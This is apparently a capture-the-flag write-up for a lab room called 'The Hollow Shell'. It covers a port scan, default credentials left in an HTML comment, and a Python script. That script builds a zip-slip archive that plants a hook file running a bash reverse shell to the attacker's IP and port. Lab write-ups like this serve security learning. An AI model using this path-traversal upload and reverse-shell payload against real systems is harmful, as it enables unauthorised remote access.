---

Name: The Hollow Shell
Difficulty: Medium
URL: https://tryhackme.com/room/hh-thehollowshell-ddb582ac
Description: You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.

---

```bash
$ rustscan -a 10.113.139.47 -r 1-65535 --ulimit 5000 -- -sC -sV
Open 10.113.139.47:22
Open 10.113.139.47:5000
```

While inspecting the page source we find this note
```html
  <!--
    ───────────────────────────────────────────────────────────────
     Byte Lotus // internal display-manager portal
     New on the floor team? IT seeds every property with the same
     starter login until you set your own:
         user: concierge
         pass: StayNoticed2024!
     (rotate it from Settings on first sign-in — most people forget)
    ───────────────────────────────────────────────────────────────
  -->
```

We use those credentials and manage to log into the staff app

Here we find info on what we should upload
```txt
Found something on the beach? Upload it as a shell (a .zip souvenir pack) to set the ambiance on the in-room tablets. Each shell must contain a shell.json manifest listing its assets (images, stylesheets).

A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand. Allowed asset types: png jpg gif svg css json.
```

If we try to upload a .txt file we get
```bash
That doesn't look like a shell (.zip expected).
```

There must be a way to get a reverse shell

A valid zip gives us
```txt
Shell 'test' brought ashore. Stored at shells/761ff009c273/ and held to the room's ear.
```

It seems like it is rejecting php files
```bash
Shell rejected: asset type not allowed: ../../shell.php
```

The `automation hooks` seems like the biggest hint, since the server is running python let's try to add a new .py file inside /hooks
```python
import zipfile

payload = """#!/usr/bin/env python3
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.138.209/4444 0>&1'")
"""

manifest = """{
  "name":"test"
}
"""

with zipfile.ZipFile("shell.zip", "w") as z:
    z.writestr("shell.json", manifest)

    z.writestr("../../hooks/post_apply.py", payload)
```

Uploading shell.zip gives us a shell
```bash
roomservice@tryhackme-2404:~$ id
uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
```

